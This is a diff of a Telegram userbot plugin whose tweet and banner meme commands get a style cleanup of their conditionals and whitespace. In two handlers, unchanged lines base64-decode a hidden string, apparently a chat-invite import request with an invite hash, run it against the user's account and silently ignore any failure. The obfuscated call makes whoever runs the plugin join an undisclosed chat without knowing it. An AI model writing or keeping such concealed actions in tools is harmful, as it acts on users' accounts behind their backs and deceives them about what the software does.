@@ -15,10 +15,13 @@ async def nope(hemlo):
             return
     tweeter = await bot.inline_query(
         "TwitterStatusBot", f"{(deEmojify(hell))}")
-    await tweeter[0].click(hemlo.chat_id,
-                            reply_to=hemlo.reply_to_msg_id,
-                            silent=True if hemlo.is_reply else False,
-                            hide_via=True)
+    await tweeter[0].click(
+        hemlo.chat_id,
+        reply_to=hemlo.reply_to_msg_id,
+        silent=bool(hemlo.is_reply),
+        hide_via=True,
+    )
+
     await hemlo.delete()
 
 
@@ -87,12 +90,8 @@ async def nekobot(borg):
     if borg.reply_to_msg_id:
         reply_to_id = await borg.get_reply_message()
     if not text:
-        if borg.is_reply:
-            if not reply_to_id.media:
-                text = reply_to_id.message
-            else:
-                await borg.edit("Send you text to Mia so she can tweet.")
-                return
+        if borg.is_reply and not reply_to_id.media:
+            text = reply_to_id.message
         else:
             await borg.edit("Send you text to Mia so she can tweet.")
             return
@@ -101,10 +100,10 @@ async def nekobot(borg):
         hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await borg.client(hell)
     except:
-        pass   
+        pass
     text = deEmojify(text)
     borgfile = await miatweet(text)
-    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id )
     await borg.delete()
 
 #@register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
@@ -231,24 +230,20 @@ async def nekobot(borg):
     if borg.reply_to_msg_id:
         reply_to_id = await borg.get_reply_message()
     if not text:
-        if borg.is_reply:
-            if not reply_to_id.media:
-                text = reply_to_id.message
-            else:
-                await borg.edit("Give text for to write on banner, man")
-                return
+        if borg.is_reply and not reply_to_id.media:
+            text = reply_to_id.message
         else:
             await borg.edit("Give text for to write on banner, man")
             return
-    await borg.edit("Your banner is under creation wait a sec...")    
+    await borg.edit("Your banner is under creation wait a sec...")
     try:
         hell = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await borg.client(hell)
     except:
-        pass   
+        pass
     text = deEmojify(text)
     borgfile = await changemymind(text)
-    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id )
     await borg.delete()
     
 #@register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
